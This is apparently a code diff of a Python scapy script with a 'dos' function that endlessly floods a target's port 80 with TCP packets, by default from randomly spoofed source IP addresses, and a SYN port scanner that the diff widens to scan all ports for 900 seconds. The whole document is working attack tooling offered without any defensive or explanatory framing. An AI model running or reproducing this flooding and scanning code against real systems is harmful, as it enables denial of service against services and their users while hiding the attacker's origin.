@@ -2,26 +2,31 @@ import random
 import sys
 from scapy import sendrecv
 from scapy.layers import inet
+from scapy import arch
 import common_port
 import time
 
 
-def dos(target_ip):
+def dos(target_ip, use_real_ip=True):
     port_list = [i for i in range(1, 65535)]
+    count = 0
     while True:
-        a = str(random.randint(1, 254))
-        b = str(random.randint(1, 254))
-        c = str(random.randint(1, 254))
-        d = str(random.randint(1, 254))
-        dot = '.'
-
-        source_ip = a + dot + b + dot + c + dot + d
-
-        for source_port in random.sample(port_list, 100):
+        if not use_real_ip:
+            a = str(random.randint(1, 254))
+            b = str(random.randint(1, 254))
+            c = str(random.randint(1, 254))
+            d = str(random.randint(1, 254))
+            dot = '.'
+            source_ip = a + dot + b + dot + c + dot + d
+        else:
+            source_ip = arch.get_if_addr('en0')
+        for source_port in random.sample(port_list, 200):
+            count += 1
             IP1 = inet.IP(src=source_ip, dst=target_ip)
             TCP1 = inet.TCP(sport=source_port, dport=80)
             pkt = IP1 / TCP1
             sendrecv.send(pkt, inter=0.001)
+            print(count)
 
 
 def port_scan(time_out, target_ip, port_list=None):
@@ -33,7 +38,8 @@ def port_scan(time_out, target_ip, port_list=None):
     for port in port_list:
         pkt = a / inet.TCP(dport=port, flags='S')
         ans = sendrecv.sr1(pkt, timeout=2)
-        if ans is not None and ans.flags == 'SA':
+        if ans is not None and ans.haslayer(
+                'TCP') and ans['TCP'].flags == 'SA':
             _expose_port.append(port)
         if _expose_port.__len__() == port_list.__len__(
         ) or time.time() - _start > time_out:
@@ -45,8 +51,8 @@ if __name__ == '__main__':
     _method = sys.argv[1]
 
     if _method == 'dos':
-        dos(target)
+        dos(target, False)
 
     elif _method == 'scan':
-        _expose_prot = port_scan(600, target, port_list=[4000, 50000])
+        _expose_prot = port_scan(900, target)
         print(_expose_prot)
